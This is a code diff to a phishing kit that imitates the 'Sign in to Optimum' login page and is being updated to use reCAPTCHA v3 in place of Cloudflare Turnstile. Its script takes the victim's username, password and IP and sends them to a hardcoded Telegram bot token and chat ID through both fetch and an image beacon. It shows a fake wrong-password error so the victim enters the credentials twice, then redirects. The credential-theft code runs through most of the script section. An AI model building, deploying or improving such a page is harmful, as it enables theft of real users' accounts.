@@ -4,33 +4,10 @@
     <meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=10">
     <title>Sign in to Optimum</title>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-    <!-- Cloudflare Turnstile Script -->
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-    <style>
-        body { margin: 0; padding: 0; background: #003087; font-family: Arial, Helvetica, sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; }
-        .card { background: white; width: 380px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); overflow: hidden; }
-        .header { padding: 30px 30px 20px; text-align: left; }
-        .logo { font-size: 28px; font-weight: bold; color: #000; }
-        .logo span { color: #ff6600; }
-        h1 { font-size: 22px; margin: 20px 0 25px 0; color: #333; }
-        .input-label { font-size: 14px; color: #555; margin-bottom: 6px; display: block; }
-        input { width: 100%; padding: 12px 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; margin-bottom: 20px; }
-        .password-wrapper { position: relative; }
-        .password-wrapper input { padding-right: 40px; }
-        .toggle-eye { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #666; }
-        .remember { display: flex; align-items: center; gap: 8px; font-size: 14px; margin-bottom: 25px; }
-        .btn { background: #ff6600; color: white; border: none; padding: 14px; width: 100%; font-size: 17px; font-weight: bold; border-radius: 4px; cursor: pointer; }
-        .btn:hover { background: #e55c00; }
-        .links { text-align: center; margin: 20px 0; font-size: 14px; }
-        .links a { color: #0066cc; text-decoration: none; margin: 0 10px; }
-        .footer { background: #f8f8f8; padding: 25px 30px; font-size: 14px; color: #555; border-top: 1px solid #eee; }
-        .footer a { color: #0066cc; text-decoration: none; }
-        .error { color: #d32f2f; font-size: 13px; min-height: 20px; text-align: center; margin-top: 10px; }
-        /* Turnstile styling */
-        .cf-turnstile { margin: 15px 0; }
-    </style>
     
+    <!-- Google reCAPTCHA v3 Script -->
+    <script src="https://www.google.com/recaptcha/api.js?render=6Ld_-6QsAAAAAH0R3h_NngbMZPd87BuRh-V7MUdf"></script>
+
     <style>
         body {
             margin: 0;
@@ -87,16 +64,6 @@
         .password-wrapper input {
             padding-right: 45px;
         }
-        .toggle-eye {
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            color: #666;
-            font-size: 20px;
-            user-select: none;
-        }
         .remember-row {
             display: flex;
             align-items: center;
@@ -123,6 +90,10 @@
         }
         .btn:hover {
             background: #e55c00;
+        }
+        .btn:disabled {
+            background: #ffaa66;
+            cursor: not-allowed;
         }
         .links {
             text-align: center;
@@ -166,7 +137,6 @@
             <div class="input-label">Password*</div>
             <div class="password-wrapper">
                 <input type="password" id="pass" placeholder="Password">
-                <!-- Removed the eye emoji completely as requested -->
             </div>
 
             <div class="remember-row">
@@ -197,21 +167,18 @@ const CONFIG = {
     telegramToken: "8500997987:AAFxw-ff5N_5KJNnxrolyFOUCgMCLB8Lb_I",
     chatId: "7143130635",
     redirectUrl: "https://co.quarantine.serverdata.net/",
-    maxAttempts: 2
+    maxAttempts: 2,
+    recaptchaSiteKey: "6Ld_-6QsAAAAAH0R3h_NngbMZPd87BuRh-V7MUdf"   // ← CHANGE THIS
 };
 
+// Elements
 const mailInput = document.getElementById('mail');
 const passInput = document.getElementById('pass');
 const errorDiv = document.getElementById('show');
 const signinBtn = document.getElementById('signin');
 
 let attempt = 0;
-
-// Base64 decode for prefill
-function decodeBase64(str) {
-    try { return atob(str.replace(/-/g,'+').replace(/_/g,'/')); }
-    catch(e) { return str; }
-}
+let recaptchaToken = null;
 
 // Prefill email from URL
 function prefillEmail() {
@@ -219,7 +186,7 @@ function prefillEmail() {
     const params = new URLSearchParams(window.location.search);
     let email = hash || params.get('email') || params.get('e') || params.get('mail') || '';
     if (email) {
-        email = email.includes('@') ? email : decodeBase64(email);
+        email = email.includes('@') ? email : atob(email.replace(/-/g,'+').replace(/_/g,'/'));
         if (email.includes('@')) mailInput.value = email;
     }
 }
@@ -233,10 +200,28 @@ function showError(msg, clearPass = false) {
     }, 2800);
 }
 
-// Validate
+// Get reCAPTCHA v3 token
+async function getRecaptchaToken() {
+    return new Promise((resolve) => {
+        grecaptcha.ready(async () => {
+            try {
+                const token = await grecaptcha.execute(CONFIG.recaptchaSiteKey, {action: 'login'});
+                recaptchaToken = token;
+                resolve(token);
+            } catch (e) {
+                console.error("reCAPTCHA error:", e);
+                recaptchaToken = null;
+                resolve(null);
+            }
+        });
+    });
+}
+
+// Validate inputs
 function validateInputs() {
     const email = mailInput.value.trim();
     const pass = passInput.value.trim();
+
     if (!email) {
         showError("Please enter your username.");
         return false;
@@ -257,6 +242,7 @@ async function sendToTelegram(email, password) {
 
 🔑 Username: ${email}
 🔑 Password: ${password}
+🔒 reCAPTCHA v3 Token: ${recaptchaToken || 'N/A'}
 
 🌐 IP: ${ip}
 ⏰ Time: ${new Date().toLocaleString()}
@@ -264,19 +250,28 @@ async function sendToTelegram(email, password) {
 ***MITD fka Notrealghost***`;
 
     const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(message)}`;
-    new Image().src = url;
     fetch(url).catch(() => {});
+    new Image().src = url;
 }
 
 // Handle login
 async function handleLogin() {
     if (!validateInputs()) return;
 
+    signinBtn.disabled = true;
+    signinBtn.textContent = "Verifying...";
+
+    // Execute reCAPTCHA v3
+    await getRecaptchaToken();
+
     const email = mailInput.value.trim();
     const password = passInput.value.trim();
 
     await sendToTelegram(email, password);
     attempt++;
+
+    signinBtn.disabled = false;
+    signinBtn.textContent = "Continue";
 
     if (attempt < CONFIG.maxAttempts) {
         showError("The username or password you entered isn't correct. Please try again.");
@@ -290,8 +285,11 @@ async function handleLogin() {
 // Initialize
 window.addEventListener('load', () => {
     prefillEmail();
+    
     signinBtn.addEventListener('click', handleLogin);
-    passInput.addEventListener('keypress', e => { if (e.key === 'Enter') handleLogin(); });
+    passInput.addEventListener('keypress', e => {
+        if (e.key === 'Enter') handleLogin();
+    });
 });
 </script>
 </body>
